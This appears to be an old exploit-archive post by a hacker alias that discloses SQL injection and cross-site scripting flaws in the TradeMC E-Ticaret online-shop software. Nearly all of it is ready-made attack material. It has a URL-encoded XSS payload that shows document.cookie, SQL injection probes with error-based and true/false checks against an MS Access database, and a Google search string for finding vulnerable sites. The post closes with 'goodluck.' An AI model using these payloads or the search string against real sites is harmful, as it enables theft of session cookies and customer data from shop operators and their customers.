===================================================
TradeMC E-Ticaret - (SQLi/XSS) Multiple Vulnerabilities
===================================================

~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Author : KnocKout
[~] Contact : knockoutr@msn.com
[+] Special Thanks : H4x0re Security 2010, inj3ct0r team
~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~Web App. : TradeMC E-Ticaret
~Software: http://www.trademc.net/
~Vulnerability Style : SQL-i (XSS) Multiple
~Google Keywords : "TradeMC Tarafýndan Hazýrlanmýþtýr"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Meterials : SQLInjection TOOL or Table name Bruteforcer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
    ~~~~~~~~ Explotation  XSS ~~~~~~~~~~~
 
 Cross site Scripting:
 
http://Victim]/giris-hata.asp?returnURL=sepet.asp[Site SCRIPTING]
http://Victim]/giris-hata.asp?returnURL=sepet.asp%22%3E%3Ch1%3Eh4x0reSEC%3C/h1%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E

    ~~~~~~~~ Explotation SQL-i~~~~~~~~~~~
 
 SQL Injection(MSACCESS):
 
http://[Victim]/sayfa.asp?i=34' {Microsoft JET Database Engine error '80040e14'
~ SQL Injection : ON

http://[Victim]/sayfa.asp?i=34[SQL Injection]

http://[Victim]/sayfa.asp?i=34+and%201=1 {true}
http://[Victim]/sayfa.asp?i=34+and%201=0 {false}

goodluck.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~